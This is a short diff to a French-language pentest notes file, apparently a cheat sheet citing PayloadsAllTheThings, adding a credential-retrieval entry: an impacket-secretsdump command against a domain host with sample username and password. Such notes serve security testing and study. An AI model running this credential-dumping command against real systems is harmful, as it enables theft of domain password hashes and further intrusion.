@@ -201,6 +201,11 @@ https://github.com/swisskyrepo/PayloadsAllTheThings
 
 ### Commandes utiles
 
+**Récupération de credentials**
+
+    impacket-secretsdump DOMAINE/Tim:Mdp123@192.168.100.100
+    
+
 **Connexion à distance**
 
 	krdc
